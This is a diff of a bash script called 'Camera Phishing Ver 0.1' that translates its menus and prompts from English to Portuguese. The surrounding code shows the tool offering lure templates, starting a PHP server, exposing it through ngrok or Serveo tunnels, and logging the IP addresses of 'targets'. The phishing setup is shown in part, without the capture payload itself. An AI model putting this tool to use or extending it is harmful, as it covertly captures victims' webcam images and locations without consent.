@@ -11,7 +11,7 @@ printf "\e[1;92m  _   _  __        __     _      ____    _  __  \e[0m\e[1;77m __
 printf "\e[1;92m | \ | | \ \      / /    / \    / ___|  | |/ /\e[0m\e[1;77m   \ \/ /\e[0m\n"
 printf "\e[1;92m |  \| |  \ \ /\ / /    / _ \   \___ \  | ' / \e[0m\e[1;77m    \  / \e[0m\n"
 printf "\e[1;92m | |\  |   \ V  V /    / ___ \   ___) | | . \ \e[0m\e[1;77m    /  \ \e[0m\n"
-printf "\e[1;92m |_| \_|    \_/\_/    /_/   \_\ |____/  |_|\_\\e[0m\e[1;77m   /_/\_\\e[0m\n"
+printf "\e[1;92m |_| \_|    \_/\_/    /_/   \_\ |____/  |_|\_\\e[0m\e[1;77m    /_/\_\\e[0m\n"
 printf " \e[1;93m Camera Phishing Ver 0.1 \e[0m \n"
 printf " \e[1;77m www.instagram.com/bruno.nwask | t.me/Nwask \e[0m \n"
 
@@ -63,7 +63,7 @@ cat ip.txt >> saved.ip.txt
 checkfound() {
 
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Pressione Ctrl + C para sair...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Esperando alvos,\e[0m\e[1;77m Pressione Ctrl + C para sair...\e[0m\n"
 while [ true ]; do
 
 
@@ -142,12 +142,12 @@ clear
 banner
 camphish
 else
-printf "\n-----Choose a template----\n"    
-printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Festival Wishing\e[0m\n"
+printf "\n-----Escolha um modelo----\n"    
+printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Desejo do Festival\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Live Youtube TV\e[0m\n"
-printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Online Meeting\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Reunião on-line\e[0m\n"
 default_option_template="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a template: [Default is 1] \e[0m' option_tem
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Escolha um modelo: [Default is 1] \e[0m' option_tem
 option_tem="${option_tem:-${default_option_template}}"
 if [[ $option_tem -eq 1 ]]; then
 read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter festival name: \e[0m' fest_name
@@ -200,16 +200,16 @@ fi
 fi
 fi
 if [[ -e ~/.ngrok2/ngrok.yml ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m] your ngrok "
+printf "\e[1;93m[\e[0m*\e[1;93m] seu ngrok "
 cat  ~/.ngrok2/ngrok.yml
-read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Do you want to change your ngrok authtoken? [Y/n]:\e[0m ' chg_token
+read -p $'\n\e[1;92m[\e[0m+\e[1;92m] Deseja alterar seu token de autenticação ngrok? [Y/n]:\e[0m ' chg_token
 if [[ $chg_token == "Y" || $chg_token == "y" || $chg_token == "Yes" || $chg_token == "yes" ]]; then
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Insira seu token de autenticação ngrok válido: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93mAuthtoken has been changed\n"
 fi
 else
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Insira seu token de autenticação ngrok válido: \e[0m' ngrok_auth
 ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
 fi
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
@@ -239,11 +239,11 @@ if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
 
-printf "\n-----Choose tunnel server----\n"    
+printf "\n-----Escolha o servidor de túnel----\n"    
 printf "\n\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: [Default is 1] \e[0m' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Escolha uma opção de encaminhamento de porta: [Default is 1] \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 select_template
 if [[ $option_server -eq 2 ]]; then
@@ -286,12 +286,12 @@ start() {
 default_choose_sub="Y"
 default_subdomain="saycheese$RANDOM"
 
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Escolher o subdomínio? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
 choose_sub="${choose_sub:-${default_choose_sub}}"
 if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
 subdomain_resp=true
-printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdominio: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
 read subdomain
 subdomain="${subdomain:-${default_subdomain}}"
 fi
